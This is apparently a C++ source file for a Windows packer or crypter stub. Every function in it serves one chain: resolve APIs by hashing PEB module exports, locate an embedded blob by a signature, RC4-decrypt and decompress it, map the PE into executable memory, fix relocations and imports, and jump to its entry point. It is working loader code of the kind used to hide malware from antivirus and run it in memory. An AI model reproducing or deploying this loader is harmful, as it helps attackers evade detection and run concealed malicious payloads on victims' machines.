#include <Windows.h>
#include <winternl.h>
#include <iostream>

#pragma pack(push, 1)
#ifdef _WIN64
typedef ULONG64 QWORD;
typedef QWORD DA;
typedef struct CustomHead
{
	QWORD size;//PE size
	QWORD offsetSection;
	QWORD numberOfSection;
	QWORD offsetRelocation;
	QWORD imageAddr;
	QWORD offsetImportTable;
	QWORD entryPoint;
	QWORD flag1;
	QWORD compressSize;
	QWORD flag2;
	QWORD rc4Size;

}*pCustomHead;
#else
typedef DWORD DA;
typedef struct CustomHead
{
	DWORD size;//PE size
	DWORD offsetSection;
	DWORD numberOfSection;
	DWORD offsetRelocation;
	DWORD imageAddr;
	DWORD offsetImportTable;
	DWORD entryPoint;
	DWORD flag1;
	DWORD compressSize;
	DWORD flag2;
	DWORD rc4Size;
}*pCustomHead;
#endif // _WIN64
#pragma pack(pop)

typedef DWORD(__stdcall *pRtlDecompressBuffer)(
	IN ULONG   CompressionFormat,
	OUT PVOID   DestinationBuffer,
	IN ULONG   DestinationBufferLength,
	IN PVOID   SourceBuffer,
	IN ULONG   SourceBufferLength,
	OUT PULONG   pDestinationSize);



DWORD getHash(const char *str)
{

	DWORD h = 0;
	while (*str) 
	{
		h = (h >> 12) | (h << (32 - 12));
		h += *str >= 'a' ? *str - 32 : *str;
		str++;
	}
	return h;

}

DWORD getUnicodeHash(const wchar_t * str) 
{
	DWORD h = 0;
	PWORD ptr = (PWORD)str;
	while (*ptr)
	{
		h = (h >> 12) | (h << (32 - 12));
		h += (BYTE)(*ptr) >= 'a' ? (BYTE)(*ptr) - 32 : (BYTE)(*ptr);
		ptr++;
	}
	return h;
}

void MemCopy(char * det, char * src, DWORD size)
{
	while(size--)
	{
		*det++ = *src++;
	}
}
DWORD MemCmp(char *buf1, char *buf2, DWORD size)
{
	while (size--)
	{
		if (*buf1++ != *buf2++)
			return size;
	}
	return 0;
}


void Rc4Decrypt(char * buff, int size, unsigned char *key)
{
	unsigned char box[256];
	unsigned int index_i = 0;
	unsigned int index_j = 0;


	//init
	for (int i = 0; i < 256; i++)
	{
		box[i] = i;
	}

	int j = 0;
	unsigned char tmp;
	for (int i = 0; i < 256; i++)
	{
		j = (j + box[i] + key[i % 16]) % 256;
		tmp = box[i];
		box[i] = box[j];
		box[j] = tmp;
	}

	for (unsigned long k = 0; k < size; k++)
	{
		index_i = (index_i + 1) % 256;    // a
		index_j = (index_j + box[index_i]) % 256; // b

		tmp = box[index_i];
		box[index_i] = box[index_j];
		box[index_j] = tmp;

		DWORD r = (box[index_i] + box[index_j]) % 256;
		buff[k] ^= box[r];
	}

}

char * GetFunction(DWORD DLLhash,DWORD APIhash)
{
	_PEB *peb = NtCurrentTeb()->ProcessEnvironmentBlock;

	LIST_ENTRY *first = peb->Ldr->InMemoryOrderModuleList.Flink;

	LIST_ENTRY *ptr = first;
	char *func = NULL;
	do {
#ifdef _WIN64
		LDR_DATA_TABLE_ENTRY *pLdr = (LDR_DATA_TABLE_ENTRY*)((BYTE*)ptr - 0x10);
#else // _WIN64
		LDR_DATA_TABLE_ENTRY *pLdr = (LDR_DATA_TABLE_ENTRY*)((BYTE*)ptr - 0x8);
#endif
		BYTE * baseAddr = (BYTE *)pLdr->DllBase;

		ptr = ptr->Flink;

		if (!baseAddr) 
			continue;
		

		PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)(baseAddr);
		PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(baseAddr + pDos->e_lfanew);
		PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(baseAddr + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
		if (!pExport) 
		{
			continue;
		}

		if (getUnicodeHash(((decltype(pLdr->FullDllName)*)(DWORD*)&(pLdr->Reserved4))->Buffer) == DLLhash) {
			DWORD* nameRVAs = (DWORD*)(baseAddr + pExport->AddressOfNames);

			for (DWORD i = 0; i < pExport->NumberOfNames; i++) 
			{
				char* funName = (char*)(baseAddr + nameRVAs[i]);
				//get address of function
				if (func == NULL && getHash(funName) == APIhash) 
				{
					WORD ordinal = ((WORD*)(baseAddr + pExport->AddressOfNameOrdinals))[i];
					DWORD functionRVA = ((DWORD*)(baseAddr + pExport->AddressOfFunctions))[ordinal];
					func = (char*)(baseAddr + functionRVA);
					break;
				}
			}
		}
		if (func != NULL) break;
	} while (ptr != first);

	return func;
}



#ifdef _WIN64
extern "C" char * getCurrAddr(void);
#else
DWORD * getCurrAddr()
{
	DWORD *p = NULL;
	_asm {
		call fun;
	fun:
		pop eax;
		mov p, eax;
	}
	return p;
}
#endif // _WIN64

char * ReadFileContent(
	pCustomHead &head,
	unsigned char ** rc4Key
)
{

#ifdef _WIN64
	char *curAddr =  getCurrAddr();
#else
	char * curAddr = (char *)getCurrAddr();
#endif

	char sign[] = {'\xaa', '\xbb', '\xcc', '\xdd', '\x01' , '\x01', '\x01', '\x01', '\x00' };
	while(curAddr ++ )
	{
		if (MemCmp(curAddr, sign, 8) == 0)
		{
			curAddr += 8;
			break;
		}
	}

	head = (pCustomHead)curAddr;
	curAddr += sizeof(CustomHead);
	
	*rc4Key = (unsigned char *)curAddr;
	curAddr += 16;

	return curAddr;
}


char* ApplySpace
(
	char * pData,
	decltype(VirtualAlloc)* pVirtualAlloc,
	pCustomHead pustomHead
)
{
	char * baseAddress = NULL;

	PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)(pData + pustomHead->offsetSection);

	pSection += pustomHead->numberOfSection - 1;

	baseAddress = (char *)pVirtualAlloc(
		(char*)pustomHead->imageAddr,
		pSection->SizeOfRawData + pSection->VirtualAddress,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (NULL == baseAddress) 
	{
		baseAddress = (char *)pVirtualAlloc(
			NULL,
			pSection->SizeOfRawData + pSection->VirtualAddress,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE);
	}

	return baseAddress;
}



void CopyToMemory(
	char*pData,
	char*address,
	pCustomHead pcustomHead
) 
{

	PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)(pData + pcustomHead->offsetSection);


	for (int i = 0; i < pcustomHead->numberOfSection; i++) 
	{
		if ((0 == pSection->VirtualAddress) || (0 == pSection->SizeOfRawData)) 
		{
			pSection++;
			continue;
		}

		DA* chSrcMem = (DA *)((DA)pData + pSection->PointerToRawData);
		DA* chDestMem = (DA *)((DA)address + pSection->VirtualAddress);
		DA dwSizeOfRawData = pSection->SizeOfRawData;
		MemCopy((char*)chDestMem, (char *)chSrcMem, dwSizeOfRawData);

		pSection++;
	}

}

void Reloaction(char *address, pCustomHead pcustomHead) {
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)address;
	
	PIMAGE_BASE_RELOCATION pRel = (PIMAGE_BASE_RELOCATION)(address + pcustomHead->offsetRelocation);
	
	if ((DA*)pRel == (DA*)pDos) 
		return;
	

	while ((pRel->VirtualAddress + pRel->SizeOfBlock) != 0) 
	{

		WORD *pLocData = (WORD*)((PBYTE)pRel + sizeof(IMAGE_BASE_RELOCATION));
		int numberOfReloc = (pRel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

		for (int i = 0; i < numberOfReloc; i++) 
		{

#ifdef _WIN64
			if ((DWORD)(pLocData[i] & 0xf000) == 0xa000) {
#else
			if ((DWORD)(pLocData[i] & 0xf000) == 0x3000) {
#endif
				DA *pAddress = (DA*)((DA)pDos + pRel->VirtualAddress + ((DWORD)pLocData[i] & 0x0fff));
				DA dwDelta = (DA)pDos - pcustomHead->imageAddr;
				*pAddress += dwDelta;
			}

		
		}
		pRel = (PIMAGE_BASE_RELOCATION)((PBYTE)pRel + pRel->SizeOfBlock);
	}
	return;
}

void LoadDll(
	char *address,
	decltype(GetModuleHandleA) * myGetModuleHandleA,
	decltype(LoadLibraryA) * myLoadLibraryA,
	decltype(GetProcAddress) *myGetProcAddress,
	pCustomHead pcustomHead
)
{

	PIMAGE_IMPORT_DESCRIPTOR pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)(address + pcustomHead->offsetImportTable);

	char *lpDllName = NULL;
	HMODULE hDll = NULL;

	PIMAGE_THUNK_DATA lpImportNameArray = NULL;
	PIMAGE_IMPORT_BY_NAME lpImportByName = NULL;
	PIMAGE_THUNK_DATA lpImportFuncAddrArray = NULL;
	FARPROC lpFuncAddress = NULL;
	DA i = 0;

	while (TRUE) 
	{
		if (0 == pImportTable->OriginalFirstThunk) 
			break;
		

		//load dll, get hmoudle
		lpDllName = (char *)((DA)address + pImportTable->Name);
		hDll = myGetModuleHandleA(lpDllName);
		if (hDll == NULL)
		{
			hDll = myLoadLibraryA(lpDllName);
			if (hDll == NULL) 
			{
				pImportTable++;
				continue;
			}
		}

		
		i = 0;
		lpImportNameArray = (PIMAGE_THUNK_DATA)((DA)address + pImportTable->OriginalFirstThunk);
		lpImportFuncAddrArray = (PIMAGE_THUNK_DATA)((DA)address + pImportTable->FirstThunk);
		while (TRUE)
		{
			if (lpImportNameArray[i].u1.AddressOfData == 0) 
				break;
			

			lpImportByName = (PIMAGE_IMPORT_BY_NAME)((DA)address + lpImportNameArray[i].u1.AddressOfData);

			if (0x80000000 & lpImportNameArray[i].u1.Ordinal) 
			{
				lpFuncAddress = myGetProcAddress(hDll, (LPCSTR)(lpImportNameArray[i].u1.Ordinal & 0x0000FFFF));
			}
			else 
			{
				lpFuncAddress = myGetProcAddress(hDll, (LPCSTR)lpImportByName->Name);
			}
			lpImportFuncAddrArray[i].u1.Function = (DA)lpFuncAddress;
			i++;
		}

		pImportTable++;
	}

}

void Run(pCustomHead pcustomHead, char *address) 
{

	DA * ExeEntry = (DA*)(address + pcustomHead->entryPoint);

	((void(*) (void)) ExeEntry)();

}

char * DeCompress(
	char *buff,
	pCustomHead pcustomHead,
	decltype(VirtualAlloc)* pVirtualAlloc,
	pRtlDecompressBuffer f_RtlDecompressBuffer
)
{
	char *outData = NULL;
	DWORD CompressionFormat = COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM;

	outData = (char *)pVirtualAlloc(NULL, pcustomHead->size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	DWORD dwDeCompress;
	f_RtlDecompressBuffer(
		CompressionFormat,
		outData,
		pcustomHead->size,
		buff,
		pcustomHead->compressSize,
		&dwDeCompress);

	return outData;
}

void func() {

	pCustomHead pCustomHead = NULL;
	unsigned char *rc4Key = NULL;

	DWORD Hash_Kernel = 0xe616dcd1;
	DWORD Hash_Ntdll = 0x2911895d;
	DWORD Hash_VirtualAlloc = 0x6b56ea61;
	DWORD Hash_RtlDecompressBuffer = 0xd75e613c;
	DWORD Hash_GetProcAddress = 0xabddce5c;
	DWORD Hash_GetModuleHandleA = 0xc74459e6;
	DWORD Hash_LoadLibraryA = 0x22f765ae;

	pRtlDecompressBuffer f_RtlDecompressBuffer = (pRtlDecompressBuffer)GetFunction(Hash_Ntdll, Hash_RtlDecompressBuffer);
	decltype(VirtualAlloc)* pVirtualAlloc = (decltype(VirtualAlloc)*) GetFunction(Hash_Kernel, Hash_VirtualAlloc);
	decltype(GetProcAddress) *pGetProcAddress = (decltype(GetProcAddress) *)GetFunction(Hash_Kernel, Hash_GetProcAddress);
	decltype(GetModuleHandleA) *pGetModuleHandleA = (decltype(GetModuleHandleA)*)GetFunction(Hash_Kernel, Hash_GetModuleHandleA);
	decltype(LoadLibraryA) * pLoadLibraryA = (decltype(LoadLibraryA) *)GetFunction(Hash_Kernel, Hash_LoadLibraryA);


	
	char *pDataBuff = ReadFileContent(pCustomHead, &rc4Key);

	if (pCustomHead->flag2)
		Rc4Decrypt(pDataBuff, pCustomHead->rc4Size, rc4Key);

	if (pCustomHead->flag1)
		pDataBuff = DeCompress(pDataBuff, pCustomHead, pVirtualAlloc, f_RtlDecompressBuffer);

	char *baseAddress = ApplySpace(pDataBuff,  pVirtualAlloc ,pCustomHead);

	CopyToMemory(pDataBuff, baseAddress, pCustomHead);

	Reloaction(baseAddress, pCustomHead);

	LoadDll(baseAddress, pGetModuleHandleA, pLoadLibraryA, pGetProcAddress, pCustomHead);

	Run(pCustomHead, baseAddress);

}


int main(int argc, char *argv[], char ** envp) 
{

	func();

	return 0;
}
